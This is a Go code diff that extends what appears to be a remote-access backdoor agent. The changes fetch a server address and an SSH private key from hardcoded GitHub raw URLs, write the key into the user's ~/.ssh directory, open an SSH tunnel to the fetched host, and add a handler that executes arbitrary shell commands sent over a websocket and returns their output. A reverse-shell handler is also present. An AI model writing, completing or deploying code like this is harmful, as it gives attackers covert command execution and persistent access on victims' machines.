@@ -17,10 +17,14 @@ import (
 )
 
 const secret = "EnCryp!e0?"
+const serverInfoUrl = "https://raw.githubusercontent.com/devoxit/static/main/test.txt"
+const keyInfoUrl = "https://raw.githubusercontent.com/devoxit/golanghub/main/build.txt"
 
 type Agent struct {
 	serverIp   string
 	serverPort string
+	localPort  string
+	sshUser    string
 	isAuth     bool
 	id         string
 	secret     string
@@ -37,22 +41,33 @@ type Payload struct {
 }
 
 func NewAgent() *Agent {
-	serverInfo := getServerInfo()
+	serverInfo := getInfo(serverInfoUrl)
 	info := strings.Split(serverInfo, " ")
-	return &Agent{
+	port := strconv.Itoa(rand.Intn(999) + 9000)
+	agent := &Agent{
 		serverIp:   info[0],
 		serverPort: info[1],
+		localPort:  port,
+		sshUser:    "ctouser",
 		isAuth:     false,
 		id:         "",
 		secret:     secret,
 		name:       "agent-" + RandomString(5),
 	}
+	setStat := agent.setSshKey()
+	if setStat != true {
+		fmt.Println("failed to setup the keys.")
+	}
+	command := "-NL " + agent.localPort + ":" + agent.serverIp + ":" + agent.serverPort + " " + agent.sshUser + "@" + agent.serverIp
+	go createTunnel(command)
+	return agent
 }
 
-func getServerInfo() string {
-	resp, err := http.Get("https://raw.githubusercontent.com/devoxit/static/main/test.txt")
+func getInfo(url string) string {
+	resp, err := http.Get(url)
 	if err != nil {
 		// handle error
+		fmt.Println(err)
 	}
 	defer resp.Body.Close()
 	body, err := io.ReadAll(resp.Body)
@@ -139,11 +154,7 @@ func (a *Agent) msgHandler(msg string) {
 	case "rs":
 		a.handleRs(payload)
 		break
-	case "sshKey":
-		a.handleRs(payload)
-		break
 	}
-
 }
 
 func (a *Agent) authReq() {
@@ -180,7 +191,13 @@ func (a *Agent) handleCmd(payload *Payload) {
 	if payload.mode != "cmd" {
 		return
 	}
-
+	args := strings.Split(payload.content, " ")
+	out, err := exec.Command(args[0], args[1:]...).Output()
+	str := string(out)
+	if err != nil {
+		str = "Error!"
+	}
+	send("/msg: "+str+" <- "+payload.from, a.ws)
 }
 
 func (a *Agent) handleMsg(payload *Payload) {
@@ -213,22 +230,23 @@ func (a *Agent) handleRs(payload *Payload) {
 	send("/msg: Shell served successfully on "+runtime.GOOS+" -> "+payload.from, a.ws)
 }
 
-func (a *Agent) handleSshKey(payload *Payload) {
-	if payload.mode != "sshKey" {
-		return
-	}
+func (a *Agent) setSshKey() bool {
+	key := getInfo(keyInfoUrl)
 	// create the file
-	f, err := os.Create("test.txt")
+	home, err := os.UserHomeDir()
 	if err != nil {
-		send("failed to create the ssh key file", a.ws)
+		return false
+	}
+	f, err := os.Create(home + "/.ssh/id_rsa_34")
+	if err != nil {
+		return false
 	}
 	defer f.Close()
 
-	fmt.Println(payload.content)
-	f.WriteString(payload.content)
+	fmt.Println(key)
+	f.WriteString(key)
 	// close the file with defer
-
-	send("/msg: Shell served successfully on "+runtime.GOOS+" -> "+payload.from, a.ws)
+	return true
 }
 
 func main() {
